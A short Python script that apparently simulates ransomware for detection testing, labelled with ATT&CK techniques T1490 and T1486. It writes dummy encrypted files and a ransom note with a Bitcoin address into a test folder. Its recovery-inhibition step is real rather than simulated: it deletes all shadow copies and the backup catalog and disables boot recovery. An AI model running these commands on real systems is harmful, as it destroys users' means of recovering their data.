import subprocess
import os

def delete_shadow_copies():
    # T1490 Inhibit System Recovery
    print("Deleting shadow copies...")
    try:
        subprocess.run("vssadmin delete shadows /all /quiet", shell=True)
        subprocess.run("wbadmin delete catalog -quiet", shell=True)
        subprocess.run("bcdedit /set {default} recoveryenabled no", shell=True)
    except Exception as e:
        print("Failed to delete shadow copies:", e)

def simulate_encryption():
    # T1486 Data Encrypted for Impact
    target_dir = "C:\\Temp\\ransom_test"
    if not os.path.exists(target_dir):
        os.makedirs(target_dir, exist_ok=True)
        
    for i in range(3):
        filepath = os.path.join(target_dir, f"document_{i}.txt.encrypted")
        with open(filepath, "w") as f:
            f.write("ENCRYPTED_DATA_BLOB_" * 10)

def drop_ransom_note():
    note_path = "C:\\Temp\\ransom_test\\HOW_TO_RECOVER_FILES.txt"
    try:
        with open(note_path, "w") as f:
            f.write("Your files have been encrypted. Pay 1 BTC to this address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n")
            f.write("Contact us at: ransomware@protonmail.com\n")
    except Exception:
        pass

if __name__ == "__main__":
    delete_shadow_copies()
    simulate_encryption()
    drop_ransom_note()
    print("Ransomware simulation complete.")
